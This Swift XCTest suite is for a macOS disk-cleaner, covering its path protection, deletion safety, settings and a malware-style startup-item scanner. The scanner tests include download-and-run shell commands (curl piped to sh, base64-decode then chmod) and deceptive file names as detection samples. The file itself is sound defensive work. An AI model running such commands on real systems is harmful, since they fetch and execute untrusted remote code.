import XCTest
@testable import SpaceSweeper

/// Protection list, safety ratings, the deletion service, the activity log and running-app detection.
final class SafetyTests: XCTestCase {
    private let home = "/Users/tester"
    private let now = Date(timeIntervalSince1970: 1_800_000_000)

    private var policy: ProtectionPolicy {
        ProtectionPolicy(home: home, appBundlePath: "/Applications/SpaceSweeper.app", now: now)
    }

    private func isLocked(_ path: String) -> Bool { policy.verdict(for: path).isLocked }

    // MARK: Protection list

    func testSystemLocationsAreLocked() {
        for path in ["/System", "/System/Library/CoreServices", "/Library/Preferences", "/usr/local/bin/tool",
                     "/bin/ls", "/sbin", "/private/var/db", "/etc/hosts", "/var/log", "/tmp/x"] {
            XCTAssertTrue(isLocked(path), path)
        }
    }

    func testPrefixMatchingIsComponentWise() {
        XCTAssertFalse(isLocked("/Users/tester/Library2/file"), "Library2 is not Library")
        XCTAssertFalse(isLocked("/Users/tester/SystemBackup.zip"))
        XCTAssertFalse(isLocked("/Users/tester/Library/Caches/com.example"), "~/Library is not /Library")
        XCTAssertFalse(isLocked("/Users/tester/.sshkeys-backup"), "only ~/.ssh itself is protected")
    }

    func testPersonalDataLocationsAreLocked() {
        let paths = [
            "/Users/tester/Library/Keychains/login.keychain-db",
            "/Users/tester/Library/Mobile Documents/com~apple~CloudDocs/a.pdf",
            "/Users/tester/.ssh/id_ed25519",
            "/Users/tester/Library/Mail/V10",
            "/Users/tester/Library/Containers/com.apple.mail/Data",
            "/Users/tester/Pictures/Photos Library.photoslibrary/originals/a.heic",
            "/Volumes/Backup/Old Photos.photoslibrary",
            "/Applications/SpaceSweeper.app",
            "/Applications/SpaceSweeper.app/Contents/MacOS/SpaceSweeper",
        ]
        for path in paths { XCTAssertTrue(isLocked(path), path) }
    }

    func testAncestorsOfProtectedItemsAreLocked() {
        XCTAssertTrue(isLocked("/Users/tester"), "home folder")
        XCTAssertTrue(isLocked("/Users"))
        XCTAssertTrue(isLocked("/"))
        XCTAssertTrue(isLocked("/Users/tester/Library"), "contains Keychains")
        XCTAssertTrue(isLocked("/Users/tester/Library/Containers"), "contains Mail data")
        XCTAssertTrue(isLocked("/Users/tester/Pictures"), "contains the Photos library")
        XCTAssertTrue(isLocked("/Applications"), "contains SpaceSweeper")
        XCTAssertTrue(isLocked("/Volumes/Backup"), "a whole volume")
        XCTAssertTrue(isLocked("/Users/tester/Documents"), "the folder itself; its contents are allowed")
        XCTAssertFalse(isLocked("/Users/tester/Documents/old.mov"))
    }

    func testDotDotCannotEscapeProtection() {
        XCTAssertTrue(isLocked("/Users/tester/Downloads/../.ssh/id_rsa"))
        XCTAssertTrue(isLocked("/Users/tester/Downloads/../../tester/Library/Keychains"))
    }

    func testWarningsForPersonalFoldersAndRecentChanges() {
        XCTAssertEqual(policy.verdict(for: "/Users/tester/Downloads/a.dmg", modified: now.addingTimeInterval(-30 * 86_400)), .allowed)
        XCTAssertEqual(policy.verdict(for: "/Users/tester/Documents/a.mov").warnings, ["Inside your Documents folder"])
        XCTAssertEqual(policy.verdict(for: "/Users/tester/Desktop/a.mov").warnings, ["Inside your Desktop folder"])
        XCTAssertEqual(policy.verdict(for: "/Users/tester/Movies/a.mov", modified: now.addingTimeInterval(-2 * 86_400)).warnings,
                       ["Modified in the last 7 days"])
    }

    // MARK: Safety advisor

    private func advisor(junk: [DevJunkItem] = []) -> SafetyAdvisor {
        SafetyAdvisor(policy: policy, junkItems: junk)
    }

    private func level(_ path: String, modified: Date? = nil, junk: [DevJunkItem] = []) -> SafetyLevel {
        advisor(junk: junk).assess(path: path, modified: modified ?? now.addingTimeInterval(-90 * 86_400)).level
    }

    func testSafetyLevelsByLocationAndType() {
        XCTAssertEqual(level("/Users/tester/Library/Caches/com.example/data.db"), .safe)
        XCTAssertEqual(level("/Users/tester/Library/Logs/app.log"), .safe)
        XCTAssertEqual(level("/Users/tester/Downloads/Installer.dmg"), .safe)
        XCTAssertEqual(level("/Users/tester/Downloads/photos.zip"), .review)
        XCTAssertEqual(level("/Users/tester/Movies/holiday.mov"), .review)
        XCTAssertEqual(level("/Users/tester/Documents/thesis.pdf"), .review)
        XCTAssertEqual(level("/Users/tester/Library/Application Support/Game/saves.dat"), .caution)
        XCTAssertEqual(level("/Users/tester/Library/Containers/com.example/Data/big.bin"), .caution)
        XCTAssertEqual(level("/Users/tester/.docker/data.img"), .caution)
        XCTAssertEqual(level("/Users/tester/VMs/Windows.utm"), .caution)
        XCTAssertEqual(level("/Users/tester/Library/Keychains/login.keychain-db"), .protected)
    }

    func testRecentlyModifiedIsNeverSafe() {
        let recent = now.addingTimeInterval(-86_400)
        let assessment = advisor().assess(path: "/Users/tester/Library/Caches/x/y", modified: recent)
        XCTAssertEqual(assessment.level, .review)
        XCTAssertTrue(assessment.notes.contains { $0.contains("last 7 days") })
    }

    func testJunkRatingAppliesToItemAndContents() {
        let junk = [
            DevJunkItem(path: "/Users/tester/code/web/node_modules", title: "node_modules — web", explanation: "npm deps.",
                        group: .projects, size: 1, safety: .safe),
            DevJunkItem(path: "/Users/tester/Library/Containers/com.docker.docker/Data/vms", title: "Docker disk image",
                        explanation: "Use docker system prune.", group: .docker, size: 1, isDeletable: false),
        ]
        XCTAssertEqual(level("/Users/tester/code/web/node_modules", junk: junk), .safe)
        let inside = advisor(junk: junk).assess(path: "/Users/tester/code/web/node_modules/react/index.js",
                                                modified: now.addingTimeInterval(-90 * 86_400))
        XCTAssertEqual(inside.level, .safe)
        XCTAssertEqual(inside.whatItIs, "Inside node_modules — web")
        XCTAssertEqual(level("/Users/tester/Library/Containers/com.docker.docker/Data/vms/0/Docker.raw", junk: junk), .protected,
                       "non-deletable junk is never offered")
    }

    func testEveryAssessmentExplainsItself() {
        let paths = ["/Users/tester/Library/Caches/a", "/Users/tester/Downloads/a.bin", "/Users/tester/x.unknownext",
                     "/Users/tester/Library/Preferences/a.plist", "/System/x", "/Users/tester/Music/a.mp3"]
        for path in paths {
            let assessment = advisor().assess(path: path)
            XCTAssertFalse(assessment.whatItIs.isEmpty, path)
            XCTAssertFalse(assessment.ifDeleted.isEmpty, path)
        }
    }

    // MARK: Deletion service

    /// Moves items into a fixture-local "Trash" so tests never touch the user's real Trash.
    private struct FixtureRemover: FileRemoving {
        let trash: URL
        func moveToTrash(_ url: URL) throws {
            try FileManager.default.createDirectory(at: trash, withIntermediateDirectories: true)
            try FileManager.default.moveItem(at: url, to: trash.appendingPathComponent(url.lastPathComponent))
        }
        func removePermanently(_ url: URL) throws {
            try FileManager.default.removeItem(at: url)
        }
    }

    /// A policy for the fixture: real rules, but the temp folder (under /private/var) is not a system location.
    private func fixturePolicy(_ fixture: TestFixture) -> ProtectionPolicy {
        var policy = ProtectionPolicy(home: fixture.path, appBundlePath: "/Applications/SpaceSweeper.app")
        policy.systemPrefixes = ["/System", "/Library", "/usr"]
        return policy
    }

    func testTrashMovesItemsAndLogsThem() throws {
        let fixture = try TestFixture(name: "home")
        let a = try fixture.file("Downloads/a.dmg", bytes: 5_000)
        let b = try fixture.file("Downloads/b.zip", bytes: 7_000)
        let log = ActivityLog(fileURL: fixture.url("log/activity.json"))
        let service = DeletionService(policy: fixturePolicy(fixture), remover: FixtureRemover(trash: fixture.url(".Trash")),
                                      log: log, freeSpace: { nil })

        let items = [DeletionItem(path: a, size: 5_000, verdict: .allowed), DeletionItem(path: b, size: 7_000, verdict: .allowed)]
        let outcome = service.perform(items, mode: .trash)

        XCTAssertEqual(outcome.removed.count, 2)
        XCTAssertTrue(outcome.failures.isEmpty)
        XCTAssertEqual(outcome.removedSize, 12_000)
        XCTAssertFalse(FileManager.default.fileExists(atPath: a))
        XCTAssertTrue(FileManager.default.fileExists(atPath: fixture.path(".Trash/a.dmg")), "recoverable from the Trash")
        let logged = ActivityLog(fileURL: fixture.url("log/activity.json")).entries
        XCTAssertEqual(Set(logged.map(\.path)), [a, b])
        XCTAssertTrue(logged.allSatisfy { $0.action == .trash })
    }

    func testLockedItemsAreNeverRemovedEvenIfPassedIn() throws {
        let fixture = try TestFixture(name: "home")
        let key = try fixture.file(".ssh/id_ed25519", bytes: 400)
        let ok = try fixture.file("Downloads/ok.dmg", bytes: 400)
        let log = ActivityLog(fileURL: fixture.url("log.json"))
        let service = DeletionService(policy: fixturePolicy(fixture), remover: FixtureRemover(trash: fixture.url(".Trash")),
                                      log: log, freeSpace: { nil })

        // The caller (wrongly) claims the key is allowed: the service re-checks and refuses.
        let outcome = service.perform([DeletionItem(path: key, size: 400, verdict: .allowed),
                                       DeletionItem(path: ok, size: 400, verdict: .allowed)], mode: .permanent)
        XCTAssertTrue(FileManager.default.fileExists(atPath: key))
        XCTAssertEqual(outcome.failures.map(\.path), [key])
        XCTAssertTrue(outcome.failures[0].message.hasPrefix("Protected"))
        XCTAssertEqual(outcome.removed.map(\.path), [ok])
        XCTAssertEqual(log.entries.map(\.action), [.permanent])
    }

    func testUncheckedItemsAreKeptAndFailuresReported() throws {
        let fixture = try TestFixture(name: "home")
        let keep = try fixture.file("Downloads/keep.zip", bytes: 100)
        let service = DeletionService(policy: fixturePolicy(fixture), remover: FixtureRemover(trash: fixture.url(".Trash")),
                                      log: ActivityLog(fileURL: fixture.url("log.json")), freeSpace: { nil })
        let outcome = service.perform([
            DeletionItem(path: keep, size: 100, verdict: .allowed, isChecked: false),
            DeletionItem(path: fixture.path("Downloads/missing.bin"), size: 100, verdict: .allowed),
        ], mode: .trash)
        XCTAssertTrue(FileManager.default.fileExists(atPath: keep))
        XCTAssertTrue(outcome.removed.isEmpty)
        XCTAssertEqual(outcome.failures.count, 1, "missing file is reported, not crashed on")
    }

    func testOutcomeMeasuresReclaimedSpace() throws {
        let fixture = try TestFixture(name: "home")
        let file = try fixture.file("Downloads/big.iso", bytes: 1_000)
        let readings = FreeSpaceReadings([1_000, 6_000])
        let service = DeletionService(policy: fixturePolicy(fixture), remover: FixtureRemover(trash: fixture.url(".Trash")),
                                      log: ActivityLog(fileURL: fixture.url("log.json")),
                                      freeSpace: { readings.next() })
        let outcome = service.perform([DeletionItem(path: file, size: 5_000, verdict: .allowed)], mode: .permanent)
        XCTAssertEqual(outcome.measuredReclaimed, 5_000)
    }

    func testReviewRequestTotalsOnlyRemovableItems() {
        let request = ReviewRequest(title: "t", kind: .files, items: [
            DeletionItem(path: "/a", size: 10, verdict: .allowed),
            DeletionItem(path: "/b", size: 20, verdict: .locked("x")),
            DeletionItem(path: "/c", size: 40, verdict: .allowed, isChecked: false),
        ])
        XCTAssertEqual(request.removableItems.map(\.path), ["/a"])
        XCTAssertEqual(request.removableSize, 10)
    }

    // MARK: Activity log

    func testCSVEscaping() {
        XCTAssertEqual(ActivityLog.escapeCSV("plain"), "plain")
        XCTAssertEqual(ActivityLog.escapeCSV("a,b"), "\"a,b\"")
        XCTAssertEqual(ActivityLog.escapeCSV("say \"hi\""), "\"say \"\"hi\"\"\"")
        XCTAssertEqual(ActivityLog.escapeCSV("line\nbreak"), "\"line\nbreak\"")
    }

    func testCSVHasHeaderAndOneRowPerEntry() {
        let entries = [
            ActivityEntry(date: Date(timeIntervalSince1970: 0), path: "/Users/t/a, b.zip", size: 2_000_000, action: .trash),
            ActivityEntry(date: Date(timeIntervalSince1970: 60), path: "/Users/t/c.iso", size: 5, action: .permanent, context: "Uninstall X"),
        ]
        let lines = ActivityLog.csv(entries).split(separator: "\n").map(String.init)
        XCTAssertEqual(lines.first, "Date,Action,Size (bytes),Size,Path,Context")
        XCTAssertEqual(lines.count, 3)
        XCTAssertTrue(lines[1].hasPrefix("1970-01-01T00:00:00Z,Moved to Trash,2000000,"))
        XCTAssertTrue(lines[1].contains("\"/Users/t/a, b.zip\""))
        XCTAssertTrue(lines[2].hasSuffix(",/Users/t/c.iso,Uninstall X"))
    }

    // MARK: Running apps

    func testOwnerDetectionForCaches() {
        XCTAssertEqual(RunningAppGuard.ownerBundleIDs(forPath: "/Users/tester/Library/Caches/com.microsoft.VSCode/x", home: home),
                       ["com.microsoft.VSCode"])
        XCTAssertEqual(RunningAppGuard.ownerBundleIDs(forPath: "/Users/tester/Library/Developer/Xcode/DerivedData", home: home),
                       [DevJunkCatalog.xcodeID, DevJunkCatalog.simulatorID].sorted())
        XCTAssertEqual(RunningAppGuard.ownerBundleIDs(forPath: "/Users/tester/Library/Application Support/Cursor/Cache", home: home),
                       ["com.todesktop.230313mzl4w4u92"])
        XCTAssertEqual(RunningAppGuard.ownerBundleIDs(forPath: "/Users/tester/Library/Saved Application State/com.example.app.savedState", home: home),
                       ["com.example.app"])
        XCTAssertEqual(RunningAppGuard.ownerBundleIDs(forPath: "/Users/tester/Library/Caches/Homebrew", home: home), [],
                       "folder names that aren't bundle IDs have no owner")
        XCTAssertEqual(RunningAppGuard.ownerBundleIDs(forPath: "/Users/tester/Movies/a.mov", home: home), [])
    }
}

/// Thread-safe queue of fake free-space readings.
private final class FreeSpaceReadings: @unchecked Sendable {
    private let lock = NSLock()
    private var values: [Int64]
    init(_ values: [Int64]) { self.values = values }
    func next() -> Int64? {
        lock.lock(); defer { lock.unlock() }
        return values.isEmpty ? nil : values.removeFirst()
    }
}

/// Settings: defaults, validation, and their effect on scanning and safety. Uses a throwaway defaults suite.
final class SettingsTests: XCTestCase {
    private var suiteName: String!
    private var settings: AppSettings!

    override func setUp() {
        suiteName = "SpaceSweeperTests-\(UUID().uuidString)"
        settings = AppSettings(defaults: UserDefaults(suiteName: suiteName)!)
    }

    override func tearDown() {
        UserDefaults().removePersistentDomain(forName: suiteName)
    }

    func testDefaults() {
        XCTAssertEqual(settings.appearance, .system)
        XCTAssertFalse(settings.scanOnLaunch)
        XCTAssertEqual(settings.excludedPaths, [])
        XCTAssertEqual(settings.recentChangeDays, 7)
        XCTAssertTrue(settings.showPermanentDelete)
    }

    func testInvalidValuesFallBackToDefaults() {
        settings.defaults.set("purple", forKey: AppSettings.Key.appearance)
        settings.defaults.set(5, forKey: AppSettings.Key.recentChangeDays)
        XCTAssertEqual(settings.appearance, .system)
        XCTAssertEqual(settings.recentChangeDays, 7)
        settings.recentChangeDays = 30
        XCTAssertEqual(settings.recentChangeDays, 30)
    }

    func testExclusionsAreDeduplicated() {
        settings.addExclusion("/tmp/a")
        settings.addExclusion("/tmp/a/b")
        settings.addExclusion("/tmp/a")
        XCTAssertEqual(settings.excludedPaths, [PathUtil.normalize("/tmp/a")])
        settings.removeExclusion(PathUtil.normalize("/tmp/a"))
        XCTAssertEqual(settings.excludedPaths, [])
    }

    func testRecentChangeWindowChangesRatingsAndWording() {
        settings.recentChangeDays = 30
        var policy = settings.protectionPolicy(home: "/Users/tester")
        policy.now = Date(timeIntervalSince1970: 1_800_000_000)
        let twentyDaysAgo = policy.now.addingTimeInterval(-20 * 86_400)
        XCTAssertEqual(policy.verdict(for: "/Users/tester/Movies/a.mov", modified: twentyDaysAgo).warnings,
                       ["Modified in the last 30 days"])
        let assessment = SafetyAdvisor(policy: policy).assess(path: "/Users/tester/Library/Caches/x/y", modified: twentyDaysAgo)
        XCTAssertEqual(assessment.level, .review, "recent under the 30-day setting, so not Safe")

        settings.recentChangeDays = 7
        var weekPolicy = settings.protectionPolicy(home: "/Users/tester")
        weekPolicy.now = policy.now
        XCTAssertEqual(SafetyAdvisor(policy: weekPolicy).assess(path: "/Users/tester/Library/Caches/x/y", modified: twentyDaysAgo).level,
                       .safe)
    }

    func testExcludedFoldersAreSkippedByTheScanner() async throws {
        let fixture = try TestFixture()
        try fixture.file("keep/a.bin", bytes: 5_000)
        try fixture.file("private-exports/b.bin", bytes: 900_000)
        var options = ScanOptions(roots: [fixture.path], homePath: fixture.path)
        options.folderKeepMinimum = 0
        options.excludedPaths = [fixture.path("private-exports")]
        let result = try await FileScanner.scan(options: options, progress: ScanProgress())
        XCTAssertNil(result.tree.index(ofPath: fixture.path("private-exports")))
        XCTAssertEqual(result.totalSize, fixture.allocated("keep/a.bin"))
        XCTAssertEqual(result.skipped.first { $0.path == fixture.path("private-exports") }?.reason, "Excluded in Settings")
    }

    func testPrivacyMarkdownMatchesInAppPolicy() throws {
        // PRIVACY.md sits at the repository root, two levels above this test file.
        let repo = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent()
        let markdown = try String(contentsOf: repo.appendingPathComponent("PRIVACY.md"), encoding: .utf8)
        XCTAssertTrue(markdown.contains("Effective \(HelpContent.privacyPolicyDate)"))
        for section in HelpContent.privacyPolicy {
            XCTAssertTrue(markdown.contains("## \(section.heading)"), section.heading)
            XCTAssertTrue(markdown.contains(section.body), "PRIVACY.md is out of date for \(section.heading)")
        }
    }
}

/// Security Check rules and scanner. Signature results are injected so rules are tested precisely.
final class SecurityCheckTests: XCTestCase {
    private let home = "/Users/tester"

    private func startup(_ program: String, arguments: [String]? = nil, status: SignatureStatus) -> SecurityFinding? {
        var plist: [String: Any] = ["Label": "test"]
        plist["ProgramArguments"] = arguments ?? [program]
        return SecurityRules.assessStartupItem(plistPath: "/Users/tester/Library/LaunchAgents/test.plist", plist: plist,
                                               signature: { _ in status }, home: home)
    }

    // MARK: Name rules

    func testDisguisedNames() {
        XCTAssertTrue(SecurityRules.isDisguisedName("Invoice.pdf.app"))
        XCTAssertTrue(SecurityRules.isDisguisedName("photo.JPG.command"))
        XCTAssertTrue(SecurityRules.isDisguisedName("statement.docx.pkg"))
        XCTAssertFalse(SecurityRules.isDisguisedName("Visual Studio Code.app"))
        XCTAssertFalse(SecurityRules.isDisguisedName("report.pdf"))
        XCTAssertFalse(SecurityRules.isDisguisedName("archive.tar.gz"), "two document-like extensions are normal")
        XCTAssertFalse(SecurityRules.isDisguisedName("my.app.backup"))
    }

    func testDeceptiveCharacters() {
        XCTAssertTrue(SecurityRules.hasDeceptiveCharacters("invoice\u{202E}fdp.app"), "right-to-left override")
        XCTAssertTrue(SecurityRules.hasDeceptiveCharacters("setup\u{200B}.pkg"), "zero-width space")
        XCTAssertFalse(SecurityRules.hasDeceptiveCharacters("Résumé 2026 – final.pdf"))
    }

    func testDownloadAndRunCommands() {
        XCTAssertTrue(SecurityRules.isDownloadAndRun(["/bin/sh", "-c", "curl -s https://x.example/p | sh"]))
        XCTAssertTrue(SecurityRules.isDownloadAndRun(["/bin/bash", "-c", "curl -fsSL https://x/y | base64 -d > /tmp/a; chmod +x /tmp/a"]))
        XCTAssertFalse(SecurityRules.isDownloadAndRun(["/bin/sh", "-c", "echo hello"]))
        XCTAssertFalse(SecurityRules.isDownloadAndRun(["/usr/bin/curl", "https://example.com"]), "curl alone isn't a shell running code")
    }

    func testHiddenPaths() {
        XCTAssertTrue(SecurityRules.isHiddenPath("/Users/tester/.local/bin/agent", home: home))
        XCTAssertTrue(SecurityRules.isHiddenPath("/Users/tester/Library/Application Support/.x/run", home: home))
        XCTAssertFalse(SecurityRules.isHiddenPath("/Applications/Zoom.app/Contents/MacOS/zoom", home: home))
    }

    // MARK: Startup items

    func testNormalStartupItemsAreNotFlagged() {
        XCTAssertNil(startup("/Applications/Zoom.app/Contents/MacOS/updater", status: .developer(name: "Zoom", team: "BJ4HAAB9B3")))
        XCTAssertNil(startup("/usr/libexec/xpcproxy", status: .apple))
        XCTAssertNil(startup("/opt/homebrew/bin/watchman", status: .adHoc), "Homebrew tools are ad-hoc signed; that's normal")
        XCTAssertNil(startup("/Users/Shared/Riot Games/Riot Client.app/Contents/MacOS/RiotClientServices",
                             status: .developer(name: "Riot Games", team: "B2X5H7Q9C4")),
                     "a signed program in /Users/Shared is fine")
    }

    func testSuspiciousStartupItems() {
        XCTAssertEqual(startup("/Users/tester/.cache/.agent/run", status: .developer(name: "X", team: "Y"))?.level, .suspicious,
                       "hidden folder")
        XCTAssertEqual(startup("/Users/Shared/updater", status: .unsigned)?.level, .suspicious, "unsigned in a shared folder")
        XCTAssertEqual(startup("/private/tmp/x", status: .adHoc)?.level, .suspicious)
        XCTAssertEqual(startup("/Applications/App.app/Contents/MacOS/app", status: .invalid("modified"))?.level, .unusual,
                       "self-updating apps break their own signature; alone that's only unusual")
        XCTAssertEqual(startup("/Users/tester/.x/app", status: .invalid("modified"))?.level, .suspicious,
                       "combined with another red flag it is suspicious")
        let curl = startup("/bin/sh", arguments: ["/bin/sh", "-c", "curl https://x | sh"], status: .apple)
        XCTAssertEqual(curl?.level, .suspicious, "Apple's /bin/sh running a download is still suspicious")
        XCTAssertEqual(curl?.program, "/bin/sh")
    }

    func testUnusualStartupItems() {
        let missing = startup("/Applications/Removed.app/Contents/MacOS/helper", status: .missing)
        XCTAssertEqual(missing?.level, .unusual)
        XCTAssertTrue(missing?.reasons.first?.contains("no longer exists") ?? false)
        XCTAssertEqual(startup("/Applications/Tool.app/Contents/MacOS/tool", status: .unsigned)?.level, .unusual)
        XCTAssertNil(SecurityRules.assessStartupItem(plistPath: "/x.plist", plist: ["Label": "empty"], signature: { _ in .unsigned }, home: home),
                     "no program, nothing to judge")
    }

    // MARK: Apps

    func testAppRules() {
        XCTAssertNil(SecurityRules.assessApp(path: "/Applications/Good.app", signature: .developer(name: "A", team: "B")))
        XCTAssertEqual(SecurityRules.assessApp(path: "/Applications/OpenSource.app", signature: .unsigned)?.level, .unusual)
        XCTAssertEqual(SecurityRules.assessApp(path: "/Applications/Patched.app", signature: .invalid("modified"))?.level, .unusual,
                       "installed apps that patch themselves (e.g. game launchers) aren't called suspicious")
        XCTAssertEqual(SecurityRules.assessApp(path: "/Users/t/Downloads/Tampered.app", signature: .invalid("modified"),
                                               category: .downloads)?.level, .suspicious, "a mismatched download is")
        XCTAssertEqual(SecurityRules.assessApp(path: "/Users/t/Downloads/Invoice.pdf.app",
                                               signature: .developer(name: "A", team: "B"), category: .downloads)?.level, .suspicious)
    }

    // MARK: Real signature checks (read-only)

    func testCodeSignatureChecks() throws {
        XCTAssertEqual(CodeSignature.status(ofPath: "/bin/ls"), .apple)
        XCTAssertEqual(CodeSignature.status(ofPath: "/no/such/program"), .missing)
        let fixture = try TestFixture()
        let script = try fixture.file("tool.sh", bytes: 0)
        try "#!/bin/sh\necho hi\n".write(toFile: script, atomically: true, encoding: .utf8)
        XCTAssertEqual(CodeSignature.status(ofPath: script), .unsigned)
    }

    // MARK: Scanner on fixtures

    func testScannerOnFixtures() throws {
        let fixture = try TestFixture(name: "home")
        let agents = try fixture.dir("Library/LaunchAgents")
        let hiddenProgram = try fixture.file(".hidden/agent", bytes: 100)
        func writeAgent(_ name: String, _ program: String) throws {
            let plist: [String: Any] = ["Label": name, "ProgramArguments": [program], "RunAtLoad": true]
            try PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0)
                .write(to: URL(fileURLWithPath: PathUtil.join(agents, "\(name).plist")))
        }
        try writeAgent("com.bad.hidden", hiddenProgram)
        try writeAgent("com.good.app", "/bin/ls")
        try writeAgent("com.gone.helper", fixture.path("Applications/Gone.app/Contents/MacOS/helper"))

        let downloads = try fixture.dir("Downloads")
        try fixture.file("Downloads/Invoice.pdf.command", bytes: 10)
        try fixture.file("Downloads/report.pdf", bytes: 10)
        let hiddenExec = try fixture.file("Downloads/.run", bytes: 10)
        chmod(hiddenExec, 0o755)
        let projectExec = try fixture.file("Downloads/project/node_modules/.bin/tool", bytes: 10)
        chmod(projectExec, 0o755)

        var scanner = SecurityScanner(home: fixture.path, startupFolders: [agents], appFolders: [],
                                      downloadFolders: [downloads])
        scanner.signature = { CodeSignature.status(ofPath: $0) }
        let findings = scanner.scan()
        let byName = Dictionary(uniqueKeysWithValues: findings.map { ($0.name, $0) })

        XCTAssertEqual(byName["com.bad.hidden.plist"]?.level, .suspicious)
        XCTAssertEqual(byName["com.gone.helper.plist"]?.level, .unusual)
        XCTAssertNil(byName["com.good.app.plist"], "Apple-signed program isn't flagged")
        XCTAssertEqual(byName["Invoice.pdf.command"]?.level, .suspicious)
        XCTAssertEqual(byName[".run"]?.level, .suspicious)
        XCTAssertNil(byName["report.pdf"])
        XCTAssertNil(byName["tool"], "executables inside node_modules are normal and skipped")
        XCTAssertEqual(findings.first?.level, .suspicious, "suspicious items are listed first")
    }
}
